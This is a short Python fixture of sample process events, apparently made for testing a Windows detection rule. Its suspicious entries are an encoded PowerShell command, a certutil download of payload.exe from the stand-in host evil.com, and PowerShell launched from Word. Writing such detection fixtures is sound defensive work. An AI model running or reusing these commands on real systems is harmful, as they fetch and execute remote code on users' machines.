SAMPLE_EVENTS = [
    {
        "process_name": "powershell.exe",
        "parent_process": "explorer.exe",
        "command_line": "powershell.exe -EncodedCommand aQBlAHgA",
        "timestamp": "2026-04-22 10:00:00"
    },
    {
        "process_name": "certutil.exe",
        "parent_process": "cmd.exe",
        "command_line": "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
        "timestamp": "2026-04-22 10:01:00"
    },
    {
        "process_name": "notepad.exe",
        "parent_process": "explorer.exe",
        "command_line": "notepad.exe notes.txt",
        "timestamp": "2026-04-22 10:02:00"
    },
    {
        "process_name": "powershell.exe",
        "parent_process": "winword.exe",
        "command_line": "powershell.exe Get-Process",
        "timestamp": "2026-04-22 10:03:00"
    }
]